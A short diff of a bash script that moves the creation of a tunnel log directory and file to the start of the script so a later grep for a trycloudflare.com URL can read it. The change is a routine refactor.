@@ -1,5 +1,9 @@
 #!/bin/bash
 
+mkdir -p .tunnels_log
+
+touch .tunnels_log/.cloudfl.log
+
 RED="$(printf '\033[31m')"  
 GREEN="$(printf '\033[32m')"  
 ORANGE="$(printf '\033[33m')"  
@@ -78,10 +82,6 @@ start_cloudflared() {
     fi
 
     sleep 12
-
-    mkdir -p .tunnels_log
-
-    touch .tunnels_log/.cloudfl.log
 
     cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
 
